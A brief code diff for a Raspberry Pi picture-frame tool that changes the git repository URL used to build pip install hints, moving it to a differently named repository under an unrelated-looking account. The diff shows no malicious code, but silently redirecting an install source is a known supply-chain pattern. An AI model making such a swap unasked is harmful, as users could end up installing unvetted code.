@@ -18,7 +18,7 @@ import sys
 
 #: picframe3 is not on PyPI, so `pip install picframe3` cannot work.  The
 #: repository is what the installer uses and what these hints have to name.
-SOURCE_URL = "git+https://github.com/sapnho/Digital-Picture-Frame-Pi-2026"
+SOURCE_URL = "git+https://github.com/ydj97szr4d-sudo/Raspi-Pic-frame-2026"
 
 
 def pip_command() -> str:
